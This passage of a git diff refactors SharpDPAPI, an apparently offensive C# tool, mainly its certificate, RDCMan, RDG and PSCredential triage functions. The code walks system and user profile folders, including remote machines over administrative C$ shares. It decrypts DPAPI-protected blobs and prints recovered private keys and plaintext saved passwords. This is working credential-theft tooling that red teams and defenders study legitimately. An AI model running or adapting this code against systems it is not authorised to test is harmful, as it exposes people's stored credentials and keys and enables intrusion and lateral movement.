+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
                         }
                     }
                 }
-                else
-                {
-                    Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
-                }
+            }
+            else
+            {
+                Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
+            }
 
+            Console.WriteLine();
+
+            foreach (var key in certDictionary.Keys)
+            {
+                if (certDictionary[key].First != "")
+                {
+                    Console.WriteLine("[*] Private key file {0} was recovered\r\n", key);
+                    Console.WriteLine("[*] PKCS1 Private key\r\n");
+                    Console.WriteLine(certDictionary[key].First);
+                    Console.WriteLine("\r\n[*] Certificate\r\n");
+                    Console.WriteLine(certDictionary[key].Second);
+                    Console.WriteLine();
+                }
+            }
+        }
+
+        public static void TriageSystemCerts(Dictionary<string, string> MasterKeys)
+        {
+            if (!Helpers.IsHighIntegrity())
+                throw new Exception("Must be elevated to triage SYSTEM credentials!\r\n");
+
+            Console.WriteLine("\r\n[*] Triaging System Certificates\r\n");
+
+            // all the SYSTEM Credential file locations
+            string[] folderLocations =
+            {
+                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys",
+                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
+                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\All Users\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys"
+            };
+
+            foreach (var location in folderLocations)
+            {
+                TriageCertFolder(location, MasterKeys, true);
+            }
+        }
+
+        public static void TriageUserCerts(Dictionary<string, string> MasterKeys, string computerName = "")
+        {
+
+            string[] userDirs;
+            if (!String.IsNullOrEmpty(computerName))
+            {
+                // if we're triaging a remote computer, check connectivity first
+                var canAccess = Helpers.TestRemote(computerName);
+                if (!canAccess)
+                {
+                    return;
+                }
+            }
+
+            //TODO have not verified with multiple users
+            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
+            {
+                var userFolder = "";
+
+                userFolder = !String.IsNullOrEmpty(computerName) ?
+                    $"\\\\{computerName}\\C$\\Users\\" :
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
+
+                userDirs = Directory.GetDirectories(userFolder);
+            }
+            else
+            {
+                // otherwise we're only triaging the current user's path
+                userDirs = new string[] { Environment.GetEnvironmentVariable("USERPROFILE") };
+            }
+
+            foreach (var dir in userDirs)
+            {
+                var parts = dir.Split('\\');
+                var userName = parts[parts.Length - 1];
+                if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
+                    continue;
+
+                var userCertkeysBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\";
+
+                if (!Directory.Exists(userCertkeysBasePath))
+                    continue;
+
+                var certDictionary = new Dictionary<string, Tuple<string, string>>();
+                var directories = Directory.GetDirectories(userCertkeysBasePath);
+
+                foreach (var directory in directories)
+                {
+                    var files = Directory.GetFiles(directory);
+
+                    foreach (var file in files)
+                    {
+                        if (!Regex.IsMatch(file, @"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                            continue;
+
+                        var fileName = Path.GetFileName(file);
+                        Console.WriteLine("\r\nCertificate file           : {0}\r\n", fileName);
+                        var certificateArray = File.ReadAllBytes(file);
+                        try
+                        {
+                            certDictionary.Add(fileName, Dpapi.DescribeCertificate(certificateArray, MasterKeys));
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
+                        }
+                    }
+                }
                 Console.WriteLine();
 
                 foreach (var key in certDictionary.Keys)
@@ -620,125 +702,7 @@ namespace SharpDPAPI
                         Console.WriteLine();
                     }
                 }
-            }
-        }
-
-        public static void TriageSystemCerts(Dictionary<string, string> MasterKeys)
-        {
-
-            if (Helpers.IsHighIntegrity())
-            {
-                Console.WriteLine("\r\n[*] Triaging System Certificates\r\n");
-
-                // all the SYSTEM Credential file locations
-                string[] folderLocations =
-                {
-                    String.Format("{0}\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys", Environment.GetEnvironmentVariable("SystemDrive")),
-                    String.Format("{0}\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA", Environment.GetEnvironmentVariable("SystemDrive")),
-                    String.Format("{0}\\Users\\All Users\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys", Environment.GetEnvironmentVariable("SystemDrive"))
-                };
-
-                foreach (string location in folderLocations)
-                {
-                    TriageCertFolder(location, MasterKeys,true);
-                }
-            }
-            else
-            {
-                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM credentials!\r\n");
-            }
-
-        }
-
-        public static void TriageUserCerts(Dictionary<string, string> MasterKeys, string computerName = "")
-        {
-
-            string[] userDirs;
-            if (!String.IsNullOrEmpty(computerName))
-            {
-                // if we're triaging a remote computer, check connectivity first
-                bool canAccess = Helpers.TestRemote(computerName);
-                if (!canAccess)
-                {
-                    return;
-                }
-            }
-
-            //TODO have not verified with multiple users
-            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
-            {
-                string userFolder = "";
-
-                if (!String.IsNullOrEmpty(computerName))
-                {
-                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
-                }
-                else
-                {
-                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
-                }
-
-                userDirs = Directory.GetDirectories(userFolder);
-            }
-            else
-            {
-                // otherwise we're only triaging the current user's path
-                userDirs = new string[] { System.Environment.GetEnvironmentVariable("USERPROFILE") };
-            }
-
-            foreach (string dir in userDirs)
-            {
-                string[] parts = dir.Split('\\');
-                string userName = parts[parts.Length - 1];
-                if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") ||
-                      dir.EndsWith("All Users")))
-                {
-                    string userCertkeysBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\", dir);
-                   
-                    if (System.IO.Directory.Exists(userCertkeysBasePath))
-                    {
-                        Dictionary<string, Tuple<string, string>> certDictionary = new Dictionary<string, Tuple<string, string>>();
-                        string[] directories = Directory.GetDirectories(userCertkeysBasePath);
-                        
-                            foreach (string directory in directories)
-                            {
-                                string[] files = Directory.GetFiles(directory);
-
-                                foreach (string file in files)
-                                {
-                                    if (Regex.IsMatch(file,@"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                                    {
-                                        string fileName = System.IO.Path.GetFileName(file);
-                                        Console.WriteLine("\r\nCertificate file           : {0}\r\n", fileName);
-                                        byte[] certificateArray = File.ReadAllBytes(file);
-                                        try
-                                        {
-                                            certDictionary.Add(fileName,Dpapi.DescribeCertificate(certificateArray, MasterKeys)); 
-                                        }
-                                        catch (Exception e)
-                                        {
-                                            Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
-                                        }
-                                    }
-                                }
-                        }
-                        Console.WriteLine();
-
-                        foreach (var key in certDictionary.Keys)
-                        {
-                            if (certDictionary[key].First != "")
-                            {
-                                Console.WriteLine("[*] Private key file {0} was recovered\r\n", key);
-                                Console.WriteLine("[*] PKCS1 Private key\r\n");
-                                Console.WriteLine(certDictionary[key].First);
-                                Console.WriteLine("\r\n[*] Certificate\r\n");
-                                Console.WriteLine(certDictionary[key].Second);
-                                Console.WriteLine();
-                            }
-                        }
-                        Console.WriteLine("[*] Hint: openssl pkcs12 -export -inkey key.pem -in cert.cer -out cert.p12");
-                    }
-                }
+                Console.WriteLine("[*] Hint: openssl pkcs12 -export -inkey key.pem -in cert.cer -out cert.p12");
             }
         }
         public static void TriageRDCMan(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false)
@@ -748,7 +712,7 @@ namespace SharpDPAPI
             if (!String.IsNullOrEmpty(computerName))
             {
                 // if we're triaging a remote computer, check connectivity first
-                bool canAccess = Helpers.TestRemote(computerName);
+                var canAccess = Helpers.TestRemote(computerName);
                 if (!canAccess)
                 {
                     return;
@@ -759,34 +723,31 @@ namespace SharpDPAPI
             {
                 Console.WriteLine("[*] Triaging RDCMan.settings Files for ALL users\r\n");
 
-                string userFolder = "";
-                if (!String.IsNullOrEmpty(computerName))
-                {
-                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
-                }
-                else
-                {
-                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
-                }
+                var userFolder = "";
+                userFolder = !String.IsNullOrEmpty(computerName) ?
+                    $"\\\\{computerName}\\C$\\Users\\" :
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
 
-                string[] dirs = Directory.GetDirectories(userFolder);
+                var dirs = Directory.GetDirectories(userFolder);
 
-                foreach (string dir in dirs)
+                foreach (var dir in dirs)
                 {
-                    string[] parts = dir.Split('\\');
-                    string userName = parts[parts.Length - 1];
-                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
-                    {
-                        string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", dir);
-                        TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
-                    }
+                    var parts = dir.Split('\\');
+                    var userName = parts[parts.Length - 1];
+
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
+                        continue;
+
+                    var userRDManFile = $"{dir}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings";
+                    TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
                 }
             }
             else
             {
                 Console.WriteLine("[*] Triaging RDCMan Settings Files for current user\r\n");
-                string userName = Environment.GetEnvironmentVariable("USERNAME");
-                string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                var userName = Environment.GetEnvironmentVariable("USERNAME");
+                var userRDManFile =
+                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings";
                 TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
             }
         }
@@ -796,153 +757,146 @@ namespace SharpDPAPI
             // triage a saved PSCredential .xml
             //  example - `Get-Credential | Export-Clixml -Path C:\Temp\cred.xml`
 
-            if (System.IO.File.Exists(credFile))
+            if (!File.Exists(credFile))
+                throw new Exception($"PSCredential .xml); file '{credFile}' is not accessible or doesn't exist!\n");
+            var lastAccessed = File.GetLastAccessTime(credFile);
+            var lastModified = File.GetLastWriteTime(credFile);
+
+            var xmlDoc = new XmlDocument();
+            xmlDoc.Load(credFile);
+
+            Console.WriteLine("    CredFile         : {0}", credFile);
+            Console.WriteLine("    Accessed         : {0}", lastAccessed);
+            Console.WriteLine("    Modified         : {0}", lastModified);
+
+            var props = xmlDoc.GetElementsByTagName("Props");
+            if (props.Count > 0)
             {
-                DateTime lastAccessed = System.IO.File.GetLastAccessTime(credFile);
-                DateTime lastModified = System.IO.File.GetLastWriteTime(credFile);
+                var userName = props[0].ChildNodes[0].InnerText;
+                var dpapiBlob = props[0].ChildNodes[1].InnerText;
 
-                XmlDocument xmlDoc = new XmlDocument();
-                xmlDoc.Load(credFile);
+                Console.WriteLine("    User Name        : {0}", userName);
 
-                Console.WriteLine("    CredFile         : {0}", credFile);
-                Console.WriteLine("    Accessed         : {0}", lastAccessed);
-                Console.WriteLine("    Modified         : {0}", lastModified);
+                var blobBytes = Helpers.StringToByteArray(dpapiBlob);
 
-                XmlNodeList props = xmlDoc.GetElementsByTagName("Props");
-                if (props.Count > 0)
+                if (blobBytes.Length > 0)
                 {
-                    string userName = props[0].ChildNodes[0].InnerText;
-                    string dpapiBlob = props[0].ChildNodes[1].InnerText;
+                    var decBytesRaw = Dpapi.DescribeDPAPIBlob(blobBytes, MasterKeys, "blob", unprotect);
 
-                    Console.WriteLine("    User Name        : {0}", userName);
-
-                    byte[] blobBytes = Helpers.StringToByteArray(dpapiBlob);
-
-                    if (blobBytes.Length > 0)
+                    if ((decBytesRaw != null) && (decBytesRaw.Length != 0))
                     {
-                        byte[] decBytesRaw = Dpapi.DescribeDPAPIBlob(blobBytes, MasterKeys, "blob", unprotect);
-
-                        if ((decBytesRaw != null) && (decBytesRaw.Length != 0))
+                        var password = "";
+                        var finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
+                        if (finalIndex > 1)
                         {
-                            string password = "";
-                            int finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
-                            if (finalIndex > 1)
-                            {
-                                byte[] decBytes = new byte[finalIndex + 1];
-                                Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
-                                password = Encoding.Unicode.GetString(decBytes);
-                            }
-                            else
-                            {
-                                password = Encoding.ASCII.GetString(decBytesRaw);
-                            }
-                            Console.WriteLine("    Password         : {0}", password);
+                            var decBytes = new byte[finalIndex + 1];
+                            Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
+                            password = Encoding.Unicode.GetString(decBytes);
                         }
+                        else
+                        {
+                            password = Encoding.ASCII.GetString(decBytesRaw);
+                        }
+
+                        Console.WriteLine("    Password         : {0}", password);
                     }
                 }
-                Console.WriteLine();
             }
-            else
-            {
-                Console.WriteLine("\r[X]  PSCredential .xml file '{0}' is not accessible or doesn't exist!\n", credFile);
-            }
+
+            Console.WriteLine();
         }
 
         public static void TriageRDCManFile(Dictionary<string, string> MasterKeys, string rdcManFile, bool unprotect = false)
         {
             // triage a specific RDCMan.settings file
 
-            if (System.IO.File.Exists(rdcManFile))
+            if (!File.Exists(rdcManFile))
+                return;
+
+            var lastAccessed = File.GetLastAccessTime(rdcManFile);
+            var lastModified = File.GetLastWriteTime(rdcManFile);
+
+            var xmlDoc = new XmlDocument();
+            xmlDoc.Load(rdcManFile);
+
+            Console.WriteLine("    RDCManFile    : {0}", rdcManFile);
+            Console.WriteLine("    Accessed      : {0}", lastAccessed);
+            Console.WriteLine("    Modified      : {0}", lastModified);
+
+
+            // show any recently used servers
+            var recentlyUsed = xmlDoc.GetElementsByTagName("recentlyUsed");
+            if (recentlyUsed[0]["server"] != null)
             {
-                DateTime lastAccessed = System.IO.File.GetLastAccessTime(rdcManFile);
-                DateTime lastModified = System.IO.File.GetLastWriteTime(rdcManFile);
-
-                XmlDocument xmlDoc = new XmlDocument();
-                xmlDoc.Load(rdcManFile);
-
-                Console.WriteLine("    RDCManFile    : {0}", rdcManFile);
-                Console.WriteLine("    Accessed      : {0}", lastAccessed);
-                Console.WriteLine("    Modified      : {0}", lastModified);
+                var recentlyUsedServer = recentlyUsed[0]["server"].InnerText;
+                Console.WriteLine("    Recent Server : {0}", recentlyUsedServer);
+            }
 
 
-                // show any recently used servers
-                XmlNodeList recentlyUsed = xmlDoc.GetElementsByTagName("recentlyUsed");
-                if (recentlyUsed[0]["server"] != null)
+            // see if there are any credential profiles
+            var credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");
+
+            if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
+            {
+                Console.WriteLine("\r\n        Cred Profiles");
+            }
+            foreach (XmlNode credProfileNode in credProfileNodes)
+            {
+                Console.WriteLine();
+                DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
+            }
+
+
+            // check default logonCredentials stuff
+            var logonCredNodes = xmlDoc.GetElementsByTagName("logonCredentials");
+
+            if ((logonCredNodes != null) && (logonCredNodes.Count != 0))
+            {
+                Console.WriteLine("\r\n        Default Logon Credentials");
+            }
+            foreach (XmlNode logonCredNode in logonCredNodes)
+            {
+                Console.WriteLine();
+                DisplayCredProfile(MasterKeys, logonCredNode, unprotect);
+            }
+
+
+            // grab the recent RDG files
+            var filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
+            var items = filesToOpen[0].ChildNodes;
+
+            // triage recently used RDG files                
+            foreach (XmlNode rdgFile in items)
+            {
+                if (Interop.PathIsUNC(rdcManFile))
                 {
-                    string recentlyUsedServer = recentlyUsed[0]["server"].InnerText;
-                    Console.WriteLine("    Recent Server : {0}", recentlyUsedServer);
-                }
-
-
-                // see if there are any credential profiles
-                XmlNodeList credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");
-
-                if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
-                {
-                    Console.WriteLine("\r\n        Cred Profiles");
-                }
-                foreach (XmlNode credProfileNode in credProfileNodes)
-                {
-                    Console.WriteLine();
-                    DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
-                }
-
-
-                // check default logonCredentials stuff
-                XmlNodeList logonCredNodes = xmlDoc.GetElementsByTagName("logonCredentials");
-
-                if ((logonCredNodes != null) && (logonCredNodes.Count != 0))
-                {
-                    Console.WriteLine("\r\n        Default Logon Credentials");
-                }
-                foreach (XmlNode logonCredNode in logonCredNodes)
-                {
-                    Console.WriteLine();
-                    DisplayCredProfile(MasterKeys, logonCredNode, unprotect);
-                }
-
-
-                // grab the recent RDG files
-                XmlNodeList filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
-                XmlNodeList items = filesToOpen[0].ChildNodes;
-
-                // triage recently used RDG files                
-                foreach (XmlNode rdgFile in items)
-                {
-                    if (Interop.PathIsUNC(rdcManFile))
+                    // If the RDCMan.settings file is a \\UNC path (so /server:X was used),
+                    //  check if the .RDG file is local or also a \\UNC path.
+                    if (!Interop.PathIsUNC(rdgFile.InnerText))
                     {
-                        // If the RDCMan.settings file is a \\UNC path (so /server:X was used),
-                        //  check if the .RDG file is local or also a \\UNC path.
-                        if (!Interop.PathIsUNC(rdgFile.InnerText))
-                        {
-                            // If the file .RDG file is local, try to translate it to the server \\UNC path
-                            string computerName = rdcManFile.Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
-                            string rdgUncPath = Helpers.ConvertLocalPathToUNCPath(computerName, rdgFile.InnerText);
-                            TriageRDGFile(MasterKeys, rdgUncPath, unprotect);
-                        }
-                        else
-                        {
-                            TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
-                        }
+                        // If the file .RDG file is local, try to translate it to the server \\UNC path
+                        var computerName = rdcManFile.Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
+                        var rdgUncPath = Helpers.ConvertLocalPathToUNCPath(computerName, rdgFile.InnerText);
+                        TriageRDGFile(MasterKeys, rdgUncPath, unprotect);
                     }
                     else
                     {
                         TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
                     }
                 }
-                Console.WriteLine();
+                else
+                {
+                    TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
+                }
             }
-            else
-            {
-                // Console.WriteLine("\r\n      [X] RDCMan.settings file '{0}' is not accessible or doesn't exist!", rdcManFile);
-            }
+            Console.WriteLine();
         }
 
         public static void DisplayCredProfile(Dictionary<string, string> MasterKeys, XmlNode credProfileNode, bool unprotect = false)
         {
             // helper that displays a Credential Profile/Logon settings XML node from RDG/RDCMan.settings files
 
-            string profileName = credProfileNode["profileName"].InnerText;
+            var profileName = credProfileNode["profileName"].InnerText;
 
             if (credProfileNode["userName"] == null)
             {
@@ -951,11 +905,11 @@ namespace SharpDPAPI
             }
             else
             {
-                string userName = credProfileNode["userName"].InnerText.Trim();
-                string domain = credProfileNode["domain"].InnerText.Trim();
-                string b64Password = credProfileNode["password"].InnerText;
-                string password = "";
-                string fullUserName = "";
+                var userName = credProfileNode["userName"].InnerText.Trim();
+                var domain = credProfileNode["domain"].InnerText.Trim();
+                var b64Password = credProfileNode["password"].InnerText;
+                var password = "";
+                var fullUserName = "";
 
                 if (String.IsNullOrEmpty(domain))
                 {
@@ -963,35 +917,35 @@ namespace SharpDPAPI
                 }
                 else
                 {
-                    fullUserName = String.Format("{0}\\{1}", domain, userName);
+                    fullUserName = $"{domain}\\{userName}";
                 }
 
                 Console.WriteLine("          Profile Name : {0}", profileName);
                 Console.WriteLine("            UserName   : {0}", fullUserName);
 
-                byte[] passwordDPAPIbytes = Convert.FromBase64String(b64Password);
+                var passwordDPAPIbytes = Convert.FromBase64String(b64Password);
 
-                if (passwordDPAPIbytes.Length > 0)
+                if (passwordDPAPIbytes.Length <= 0)
+                    return;
+
+                var decBytesRaw = Dpapi.DescribeDPAPIBlob(passwordDPAPIbytes, MasterKeys, "rdg", unprotect);
+
+                if (decBytesRaw.Length != 0)
                 {
-                    byte[] decBytesRaw = Dpapi.DescribeDPAPIBlob(passwordDPAPIbytes, MasterKeys, "rdg", unprotect);
-
-                    if (decBytesRaw.Length != 0)
+                    // chop off anything after the UNICODE end
+                    var finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
+                    if (finalIndex > 1)
                     {
-                        // chop off anything after the UNICODE end
-                        int finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
-                        if (finalIndex > 1)
-                        {
-                            byte[] decBytes = new byte[finalIndex + 1];
-                            Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
-                            password = Encoding.Unicode.GetString(decBytes);
-                        }
-                        else
-                        {
-                            password = Encoding.ASCII.GetString(decBytesRaw);
-                        }
+                        var decBytes = new byte[finalIndex + 1];
+                        Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
+                        password = Encoding.Unicode.GetString(decBytes);
                     }
-                    Console.WriteLine("            Password   : {0}", password);
+                    else
+                    {
+                        password = Encoding.ASCII.GetString(decBytesRaw);
+                    }
                 }
+                Console.WriteLine("            Password   : {0}", password);
             }
         }
 
@@ -999,14 +953,14 @@ namespace SharpDPAPI
         {
             // parses a RDG connection file, decrypting any password blobs as appropriate
 
-            if (System.IO.File.Exists(rdgFilePath))
+            if (File.Exists(rdgFilePath))
             {
                 Console.WriteLine("\r\n      {0}", rdgFilePath);
 
-                XmlDocument xmlDoc = new XmlDocument();
+                var xmlDoc = new XmlDocument();
                 xmlDoc.Load(rdgFilePath);
 
-                XmlNodeList credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");
+                var credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");
 
                 if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
                 {
@@ -1018,7 +972,7 @@ namespace SharpDPAPI
                     DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
                 }
 
-                XmlNodeList servers = xmlDoc.GetElementsByTagName("server");
+                var servers = xmlDoc.GetElementsByTagName("server");
 
                 if ((servers != null) && (servers.Count != 0))
                 {
@@ -1062,14 +1016,14 @@ namespace SharpDPAPI
         {
             // triage a specific RDG folder
 
-            if (System.IO.Directory.Exists(folder))
+            if (Directory.Exists(folder))
             {
-                string[] systemFiles = Directory.GetFiles(folder);
+                var systemFiles = Directory.GetFiles(folder);
                 if ((systemFiles != null) && (systemFiles.Length != 0))
                 {
                     Console.WriteLine("\r\nFolder       : {0}\r\n", folder);
 
-                    foreach (string file in systemFiles)
+                    foreach (var file in systemFiles)
                     {
                         if (file.EndsWith(".rdg"))
                         {
